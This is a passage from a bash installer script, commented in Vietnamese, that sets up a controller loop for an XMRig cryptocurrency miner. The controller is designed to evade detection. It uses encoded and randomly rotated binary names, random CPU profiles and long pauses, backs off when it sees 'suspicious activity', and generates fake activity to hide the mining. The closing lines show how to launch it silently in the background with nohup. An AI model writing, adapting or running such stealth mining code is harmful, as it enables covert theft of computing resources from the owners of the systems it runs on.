        sleep 60 # Kiểm tra lại sau 1 phút
        continue
    fi

    if [ -n "\$suspicious_pause_end_timestamp" ] && (( current_timestamp >= suspicious_pause_end_timestamp )); then
        log_message "Suspicious activity pause ended. Resuming normal operations."
        suspicious_pause_end_timestamp=""
    fi

    local should_run_miner=0
    if is_xmrig_active; then
        local profile_info=\${cpu_profiles_encoded[\$current_profile_id]}
        local decoded_profile_info=\$(decode_string "\$profile_info")
        local min_duration_minutes=\$(echo "\$decoded_profile_info" | cut -d',' -f4)
        local max_duration_minutes=\$(echo "\$decoded_profile_info" | cut -d',' -f5)

        local time_since_last_run_minutes=\$(( (current_timestamp - last_run_timestamp) / 60 ))

        if (( time_since_last_run_minutes >= max_duration_minutes )) || (( RANDOM % 100 < CHANCE_TO_SWITCH_PROFILE )); then
            stop_miner
            log_message "Miner finished current profile or switching. Stopping miner."

            if (( RANDOM % 100 < CHANCE_FOR_LONG_PAUSE )); then
                local pause_duration_hours=\$(( LONG_PAUSE_MIN_HOURS + RANDOM % (LONG_PAUSE_MAX_HOURS - LONG_PAUSE_MIN_HOURS + 1) ))
                long_pause_end_timestamp=\$(( current_timestamp + pause_duration_hours * 3600 ))
                log_message "Entering long pause for \$pause_duration_hours hours until \$(date -d @\$long_pause_end_timestamp)."
                echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
                run_fake_activity
                sleep 60 # Kiểm tra lại sau 1 phút
                continue
            fi

            current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
            if (( RANDOM % 100 < CHANCE_TO_CHANGE_BIN_NAME )); then
                current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
            else
                if [ -z "\$current_bin_name_encoded" ]; then
                    current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
                fi
            fi
            should_run_miner=1
        else
            log_message "Miner still running current profile. Next check in $(( max_duration_minutes - time_since_last_run_minutes )) minutes."
            should_run_miner=0
        fi
    else
        if [ -n "\$long_pause_end_timestamp" ] && (( current_timestamp >= long_pause_end_timestamp )); then
            log_message "Long pause ended. Resuming normal operations."
            long_pause_end_timestamp=""
        fi

        if [ -z "\$current_profile_id" ] || [ -z "\$current_bin_name_encoded" ]; then
            current_profile_id=\$(( RANDOM % \${#cpu_profiles_encoded[@]} ))
            current_bin_name_encoded=\${bin_names_encoded[\$RANDOM % \${#bin_names_encoded[@]}]}
            log_message "Initializing miner with new profile and binary name."
        fi

        if (( RANDOM % 100 < CHANCE_TO_RUN )); then
            should_run_miner=1
            log_message "Chance to run met. Attempting to start miner."
        else
            log_message "Chance to run not met. Miner remains stopped."
        fi
    fi

    if [ "\$should_run_miner" -eq 1 ]; then
        start_miner "\$current_profile_id" "\$current_bin_name_encoded"
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
    else
        echo "\$current_timestamp \$current_profile_id \$current_bin_name_encoded \$long_pause_end_timestamp \$suspicious_pause_end_timestamp" > "\$STATE_FILE"
    fi

    run_fake_activity

    # Thời gian chờ giữa các lần kiểm tra chính
    sleep 60 # Chạy lại vòng lặp mỗi phút để kiểm tra và duy trì
done
EOF

# Loại bỏ các phần liên quan đến Systemd và Cron
echo "Trong môi trường container, Systemd và Cron không được sử dụng để quản lý dịch vụ."

echo "Cài đặt hoàn tất."
echo "Để **khởi động miner**, hãy chạy lệnh sau (nó sẽ chạy ngầm và tự duy trì):"
echo "  nohup /bin/bash $MINER_DIR/master_controller.sh > /dev/null 2>&1 &"
echo ""
echo "Để **kiểm tra log của miner** (các hoạt động và trạng thái):"
echo "  tail -f $MINER_DIR/controller.log"
echo ""
echo "Để **dừng miner** (bao gồm cả script điều khiển và tiến trình XMRig):"
echo "  pkill -9 -f \"$MINER_DIR/master_controller.sh\" && pkill -9 -f \"$(echo "$MINER_ACTUAL_PATH" | sed 's/\./\\\./g')\""
echo ""
echo "Vui lòng giữ các lệnh này để quản lý miner của bạn."
